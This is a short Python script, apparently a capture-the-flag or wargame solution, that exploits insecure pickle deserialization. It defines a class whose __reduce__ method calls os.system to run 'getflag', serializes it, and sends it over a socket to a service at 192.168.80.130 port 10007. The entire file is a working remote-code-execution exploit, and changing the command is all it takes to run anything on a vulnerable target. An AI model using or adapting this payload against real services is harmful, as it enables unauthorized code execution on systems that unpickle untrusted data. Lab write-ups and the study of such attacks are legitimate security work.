#!/usr/bin/python

import os
import pickle
import socket
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('getflag > /tmp/level17_test',))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.80.130', 10007))
print s.recv(1024)
s.send(pickle.dumps(Exploit()))
s.close()
print('FINISHED')
